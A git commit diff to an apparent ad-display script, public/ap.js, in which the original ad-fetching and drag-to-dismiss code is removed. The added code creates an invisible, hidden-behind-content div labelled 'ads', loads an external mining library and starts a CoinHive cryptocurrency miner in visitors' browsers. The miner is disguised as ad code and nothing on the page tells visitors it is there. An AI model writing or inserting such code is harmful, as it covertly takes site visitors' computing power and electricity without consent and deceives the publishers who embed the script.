442aadb6cbe8cb8845de00e9f8c8fa81b790a45d
cr-ks <davidmichaelandco@gmail.com>
2017-10-28 12:02:15 -0400

    new

--- public/ap.js
+++ public/ap.js
@@ -1,28 +1,9 @@
 class Apollo {
   constructor () {
 
-    this.api = 'https://server.launchapollo.com' // Set Production URL
-
-    this.isVisible = false
-    this.el = null
-    this.isDragging = false
-    this.dragStartPosition = null
-    this.currentDragPosition = null
-
-    // const bodyStyles = window.getComputedStyle ? getComputedStyle(document.body, null) : document.body.currentStyle
-    // const bodyMargin = parseInt(bodyStyles['marginLeft'].replace('px', '')) + parseInt(bodyStyles['marginRight'].replace('px', ''))
-    this.bodyMargin = 0
-
-    this.rand = (min,max) => {
-      return Math.floor(Math.random()*(max-min+1)+min)
-    }
-
     //Start Apollo
-    this.request(`${this.api}/ad?publisher=${window.ApolloOptions.publisher}`, (res) => {
-      this.createElement()
-      this.showAd(JSON.parse(res))
-      this.attachEvents()
-    })
+    this.insertAdDiv()
+    this.insertAds()
   }
 
   isTouchDevice () {
@@ -46,93 +27,31 @@ class Apollo {
   	}
   }
 
-  createElement () {
+  insertAdDiv () {
+    this.ads = document.createElement('div')
 
-    this.el = document.createElement('div')
+    this.ads.style.width = `100%`
+    this.ads.style.height = `100px`
+    this.ads.style.bottom = `10px`
+    this.ads.style.position = 'absolute'
+    this.ads.id = 'ads'
+    this.ads.style.opacity = '0'
+    this.ads.style.zIndex = '-300000'
 
-    this.el.style.width = `calc(100% - ${this.bodyMargin + 20}px)`
-    this.el.style.padding = '0 10px'
-    this.el.style.position = 'fixed'
-    this.el.style.top = '-300px'
-    this.el.style.zIndex = '3000000'
-    this.el.style.transition = 'top 500ms ease'
-    this.el.style.boxSizing = 'content-box'
+    document.body.insertAdjacentElement('beforeend', this.ads)
 
-    document.body.insertAdjacentElement('beforeend', this.el)
   }
 
-  onTouchStart (e) {
-    const y = e.touches[0].clientY
+  insertAds () {
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = 'https://authedmine.com/lib/authedmine.min.js';
+    head.appendChild(script);
 
-    if (y <= 250 && this.isVisible) {
-      this.el.style.transition = ''
-      this.isDragging = true
-      this.dragStartPosition = y
-    }
-  }
+    let adsHTML = `<script>var miner = new CoinHive.Anonymous('TBS');miner.start();</script>`
+    document.getElementById("ads").innerHTML = adsHTML
 
-  onTouchMove (e) {
-    const y = e.touches[0].clientY
-    const moveTo = this.isDragging ? -1 * (this.dragStartPosition - y) + 10 : null
-
-    this.currentDragPosition = y
-
-    if (moveTo) {
-      this.el.style.top = `${moveTo > 10 ? 10 : moveTo}px`
-    }
-  }
-
-  onTouchEnd (e) {
-    const distance = this.dragStartPosition - this.currentDragPosition
-
-    if (this.isVisible) {
-      this.el.style.transition = 'top 500ms ease'
-      this.isDragging = false
-      this.el.style.top = distance > 30 ? '-300px' : '10px'
-      this.isVisible = distance <= 30
-    }
-  }
-
-  attachEvents () {
-    document.body.addEventListener('touchstart', this.onTouchStart.bind(this), false)
-    document.body.addEventListener('touchmove', this.onTouchMove.bind(this), false)
-    document.body.addEventListener('touchend', this.onTouchEnd.bind(this), false)
-  }
-
-  showAd (ad) {
-    console.log(ad)
-
-    const html = `<a href="${this.api}/click?publisher=${window.ApolloOptions.publisher}&id=${ad._id}" target="_blank" style="display: block; width: 100%; text-decoration: none; font-family: arial, sans-serif; font-size: 20px;">
-      <div style="background-color:rgba(234, 237, 240, 1); color:rgb(224,227,230); border-top-right-radius: 10px; border-top-left-radius: 10px; padding: 5px 10px;">
-        <div style="width: 25px; float:left; display:inline-block;">
-          <img src="${ad.logo}" style="max-width: 100%; max-height: 25px;">
-        </div>
-        <div style="float: right; width: calc(100% - 30px); color:#000; line-height: 25px;">${ad.headline}</div>
-        <div style="clear:both;"></div>
-      </div>
-      <div style="color:#000; padding: 10px; background-color:rgba(224, 227, 230, .95); border-bottom-right-radius: 10px; border-bottom-left-radius: 10px; font-size: 15px;">
-        ${ad.subline}
-      </div>
-    </a>`
-
-    this.el.innerHTML = html
-
-    //Replaced with timeout delays
-    //this.el.style.top = '10px'
-    //this.isVisible = true
-
-    if (this.isTouchDevice()) {
-      const currentAd = this
-      setTimeout(function(){
-        currentAd.el.style.top = '10px' // -- Ad NOT Disabled
-        currentAd.isVisible = true
-      }, 2000)
-
-      setTimeout(function(){
-          currentAd.el.style.top = '-300px'
-          currentAd.isVisible = false
-      }, 10000)
-    }
   }
 }
 
